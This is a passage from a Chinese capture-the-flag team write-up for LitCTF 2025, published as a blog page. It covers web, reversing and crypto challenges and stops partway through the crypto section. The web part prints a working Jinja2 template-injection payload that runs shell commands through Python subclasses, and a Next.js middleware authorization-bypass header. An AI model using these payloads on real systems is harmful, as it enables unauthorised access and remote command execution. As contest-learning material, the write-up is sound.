<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="第一次写参赛wp，新号别搞">
<meta property="og:type" content="article">
<meta property="og:title" content="LitCTF-旗山湖游泳WP">
<meta property="og:url" content="http://example.com/2025/05/26/LitCTF-%E6%97%97%E5%B1%B1%E6%B9%96%E6%B8%B8%E6%B3%B3WP/index.html">
<meta property="og:site_name" content="3a0-Eminem">
<meta property="og:description" content="第一次写参赛wp，新号别搞">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/re1.png">
<meta property="og:image" content="http://example.com/image/2eedfd9164d94537b02793b04d5c1193-1.png">
<meta property="og:image" content="http://example.com/image/re2.png">
<meta property="og:image" content="http://example.com/image/5442ef9b27e5e9231e78133cd0598430.png">
<meta property="og:image" content="http://example.com/image/re3.png">
<meta property="og:image" content="http://example.com/image/re4.png">
<meta property="og:image" content="http://example.com/image/re5.png">
<meta property="og:image" content="http://example.com/image/re6.png">
<meta property="og:image" content="http://example.com/image/re7.png">
<meta property="og:image" content="http://example.com/image/re8.png">
<meta property="og:image" content="http://example.com/image/re9.png">
<meta property="og:image" content="http://example.com/image/misc1.png">
<meta property="og:image" content="http://example.com/image/out.png">
<meta property="og:image" content="http://example.com/image/16c2c7e57d28c8735147f184eb2e7326.png">
<meta property="og:image" content="http://example.com/image/4097747ddcf913e288047c602c4fbad4.png">
<meta property="og:image" content="http://example.com/image/misc2.png">
<meta property="article:published_time" content="2025-05-26T06:13:48.000Z">
<meta property="article:modified_time" content="2025-05-26T06:33:49.952Z">
<meta property="article:author" content="3a0-Eminem">
<meta property="article:tag" content="赛题">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/re1.png">

<link rel="canonical" href="http://example.com/2025/05/26/LitCTF-%E6%97%97%E5%B1%B1%E6%B9%96%E6%B8%B8%E6%B3%B3WP/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>LitCTF-旗山湖游泳WP | 3a0-Eminem</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">3a0-Eminem</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/05/26/LitCTF-%E6%97%97%E5%B1%B1%E6%B9%96%E6%B8%B8%E6%B3%B3WP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="3a0-Eminem">
      <meta itemprop="description" content="No Human is Limited">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="3a0-Eminem">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          LitCTF-旗山湖游泳WP
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2025-05-26 14:13:48 / 修改时间：14:33:49" itemprop="dateCreated datePublished" datetime="2025-05-26T14:13:48+08:00">2025-05-26</time>
            </span>

          
            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span id="busuanzi_value_page_pv"></span>
            </span>
            <div class="post-description">第一次写参赛wp，新号别搞</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>队伍名:旗山湖游泳<br>队伍人数:3<br>队伍成员: 3a0-Eminem,Susen,Cyzrjz<br>队伍排名:54</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="星愿信箱"><a href="#星愿信箱" class="headerlink" title="星愿信箱"></a><strong>星愿信箱</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: node9.anna.nssctf.cn:23356</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Referer: http://node9.anna.nssctf.cn:23356/</span><br><span class="line"></span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">Content-Length: 138</span><br><span class="line"></span><br><span class="line">Origin: http://node9.anna.nssctf.cn:23356</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1746415538,1746510112,1747847520,1748145449; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748145449; HMACCOUNT=188CEC66A9F931A2</span><br><span class="line"></span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Priority: u=0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% raw %&#125;</span><br><span class="line">&#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;你&#123;% if &#x27;&#x27;.__class__.__base__.__subclasses__()[141].__init__.__globals__.os.popen(&#x27;tac /f*&#x27;).read()[43] == &#x27;§r§&#x27; %&#125;success&#123;% endif %&#125;&quot;</span>&#125;</span><br><span class="line">&#123;% endraw %&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>懒得写脚本,我是用BP爆破的</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">你&#123;% if 2&gt;1 %&#125;success&#123;% endif %&#125;可以回显success 说明执行成功</span><br><span class="line">&#123;% if &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[§1§].__init__.__globals__.os %&#125;success&#123;% endif %&#125;</span><br><span class="line">BP爆破得到好几个可用的,选了141</span><br></pre></td></tr></table></figure>


<h3 id="nest-js"><a href="#nest-js" class="headerlink" title="nest_js"></a><strong>nest_js</strong></h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GET /dashboard HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: node9.anna.nssctf.cn:27064</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line"></span><br><span class="line">Referer: http://node9.anna.nssctf.cn:27064/login</span><br><span class="line"></span><br><span class="line">Origin: http://node9.anna.nssctf.cn:27064</span><br><span class="line"></span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=1746415538,1746510112,1747847520,1748145449; Hm_lpvt_648a44a949074de73151ffaa0a832aec=1748145449; HMACCOUNT=188CEC66A9F931A2</span><br><span class="line"></span><br><span class="line">X-nextjs-data: 1</span><br><span class="line"></span><br><span class="line">X-Middleware-Subrequest:src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware</span><br><span class="line"></span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line"></span><br><span class="line">Priority: u=0</span><br></pre></td></tr></table></figure>

<p>Next.js 中间件授权绕过</p>
<p>先加请求头X-nextjs-data: 1,发现响应包含x-nextjs-rewrite标头,加入payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Middleware-Subrequest: src/middleware:nowaf:src/middleware:src/middleware:src/middleware:src/middleware:middleware:middleware:nowaf:middleware:middleware:middleware:pages/_middleware</span><br></pre></td></tr></table></figure>

<p>网上找的nady,直接用就行,参考链接:<a target="_blank" rel="noopener" href="https://cn-sec.com/archives/3882200.html#google_vignette">https://cn-sec.com/archives/3882200.html#google_vignette</a></p>
<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="easy-rc4"><a href="#easy-rc4" class="headerlink" title="easy_rc4"></a>easy_rc4</h3><p><img src="/image/re1.png" alt="alt text"><br>一眼<code>key = FenKey!!</code>，提取出密文后直接在线网站解码<br><img src="/image/2eedfd9164d94537b02793b04d5c1193-1.png" alt="alt text"></p>
<p>后面还有个<code>xor 0x20的操作</code></p>
<p><img src="/image/re2.png" alt="alt text"></p>
<p><img src="/image/5442ef9b27e5e9231e78133cd0598430.png" alt="alt text"></p>
<blockquote>
<p>LitCTF{71bb2a06417a5306ba297ddcfce7b1b0}</p>
</blockquote>
<h3 id="pickle"><a href="#pickle" class="headerlink" title="pickle"></a>pickle</h3><p>python的Pickle反序列化，用pickletools提取字节流反汇编</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.pickle&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line">pickletools.dis(data)</span><br></pre></td></tr></table></figure>
<p>翻译后大概是这样</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">user_input</span>):</span><br><span class="line">    raw = <span class="built_in">input</span>(<span class="string">&quot;input your flag &gt; &quot;</span>)  </span><br><span class="line">    flag_bytes = raw.encode()    </span><br><span class="line"></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_flag)):</span><br><span class="line">        b = flag_bytes[i] ^ key_ints[i % <span class="built_in">len</span>(key_ints)]</span><br><span class="line">        result.append(b) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">tuple</span>(result) == encrypted_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Good job! You made it!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Nah, don&#x27;t give up!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>提取出<code>encrypted_flag</code>和<code>key_ints</code></p>
<p>逆向</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">boom</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *flag, <span class="type">int</span> key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">45</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">45</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        tmp[i] = flag[i] + key;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(tmp,<span class="string">&quot;LitCTF&quot;</span>) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,tmp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> encrypted_flag[] = &#123;</span><br><span class="line">        <span class="number">85</span>, <span class="number">84</span>, <span class="number">174</span>, <span class="number">227</span>, <span class="number">132</span>, <span class="number">190</span>, <span class="number">207</span>, <span class="number">142</span>, <span class="number">77</span>, <span class="number">24</span>, <span class="number">235</span>, <span class="number">236</span>, <span class="number">231</span>,</span><br><span class="line">        <span class="number">213</span>, <span class="number">138</span>, <span class="number">153</span>, <span class="number">60</span>, <span class="number">29</span>, <span class="number">241</span>, <span class="number">241</span>, <span class="number">237</span>, <span class="number">208</span>, <span class="number">144</span>, <span class="number">222</span>, <span class="number">115</span>, <span class="number">16</span>,</span><br><span class="line">        <span class="number">242</span>, <span class="number">239</span>, <span class="number">231</span>, <span class="number">165</span>, <span class="number">157</span>, <span class="number">224</span>, <span class="number">56</span>, <span class="number">104</span>, <span class="number">242</span>, <span class="number">128</span>, <span class="number">250</span>, <span class="number">211</span>, <span class="number">150</span>,</span><br><span class="line">        <span class="number">225</span>, <span class="number">63</span>, <span class="number">29</span>, <span class="number">242</span>, <span class="number">169</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">short</span> key[] = &#123;</span><br><span class="line">        <span class="number">19</span>, <span class="number">55</span>, <span class="number">192</span>, <span class="number">222</span>, <span class="number">202</span>, <span class="number">254</span>, <span class="number">186</span>, <span class="number">190</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">45</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">45</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = encrypted_flag[i] ^ key[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0xFF</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">boom</span>(flag,i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>LitCTF{6d518316-5075-40ff-873a-d1e8d632e208}</p>
</blockquote>
<h3 id="easy-tea"><a href="#easy-tea" class="headerlink" title="easy_tea"></a>easy_tea</h3><p>看题目带有tea，猜测tea模板题，解压出来文件名为”花”，猜测有花指令</p>
<p>IDA载入无法直接F5，直接分析反汇编大体内容</p>
<p><img src="/image/re3.png" alt="alt text"><br>找到疑似key和密文的数据，再找找TEA算法在哪实现</p>
<p><img src="/image/re4.png" alt="alt text"></p>
<p>进入call内部</p>
<p><img src="/image/re5.png" alt="alt text"></p>
<p>去花，然后重构，长这样<br><img src="/image/re6.png" alt="alt text"></p>
<p>TEA的delta值被魔改了，为0x114514<br><img src="/image/re7.png" alt="alt text"></p>
<p>回到main函数，修复试试<br><img src="/image/re8.png" alt="alt text"><br>NOP掉上图红框部分和上面的<code>db 0</code>，再nop掉<code>jmp     short loc_4150A9</code></p>
<p><img src="/image/re9.png" alt="alt text"><br>还是有点问题，但没影响了，解密时记得小端序存储问题就行了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// TEA 解密模板（delta=0x114514）</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">tea_decrypt</span><span class="params">(<span class="type">uint32_t</span> v[<span class="number">2</span>], <span class="type">const</span> <span class="type">uint32_t</span> k[<span class="number">4</span>])</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0    = v[<span class="number">0</span>];</span><br><span class="line">    <span class="type">uint32_t</span> v1    = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> delta = <span class="number">0x114514</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum   = delta * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k[<span class="number">2</span>]) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k[<span class="number">3</span>]);</span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k[<span class="number">0</span>]) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> enc[] = &#123;</span><br><span class="line">        <span class="number">0x977457FE</span>,<span class="number">0x0DA3E1880</span>,</span><br><span class="line">        <span class="number">0x0B8169108</span>,<span class="number">0x1E95285C</span>,</span><br><span class="line">        <span class="number">0x1FE7E6F2</span>,<span class="number">0x2BC5FC57</span>,</span><br><span class="line">        <span class="number">0x0B28F0FA8</span>,<span class="number">0x8E0E0644</span>,</span><br><span class="line">        <span class="number">0x68454425</span>,<span class="number">0x0C57740D9</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">size_t</span> n_enc    = <span class="built_in">sizeof</span>(enc)/<span class="built_in">sizeof</span>(enc[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">size_t</span> n_blocks = n_enc / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> key[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x11223344</span>, <span class="number">0x55667788</span>,</span><br><span class="line">        <span class="number">0x99AABBCC</span>, <span class="number">0xDDEEFF11</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span> flag[n_blocks*<span class="number">8</span> + <span class="number">1</span>];</span><br><span class="line">    <span class="type">size_t</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; n_blocks; i++) &#123;</span><br><span class="line">        <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123; enc[<span class="number">2</span>*i], enc[<span class="number">2</span>*i + <span class="number">1</span>] &#125;;</span><br><span class="line">        <span class="built_in">tea_decrypt</span>(v, key);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">4</span>; b++) &#123;</span><br><span class="line">            flag[pos++] = (v[<span class="number">0</span>] &gt;&gt; (<span class="number">8</span> * b)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> b = <span class="number">0</span>; b &lt; <span class="number">4</span>; b++) &#123;</span><br><span class="line">            flag[pos++] = (v[<span class="number">1</span>] &gt;&gt; (<span class="number">8</span> * b)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    flag[pos] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>LitCTF{590939df61690383a47ed1bc6ade9d51}</p>
</blockquote>
<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="第一题-basic"><a href="#第一题-basic" class="headerlink" title="第一题:basic"></a>第一题:basic</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag </span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">n = getPrime(<span class="number">1024</span>)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 150624321883406825203208223877379141248303098639178939246561016555984711088281599451642401036059677788491845392145185508483430243280649179231349888108649766320961095732400297052274003269230704890949682836396267905946735114062399402918261536249386889450952744142006299684134049634061774475077472062182860181893</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span 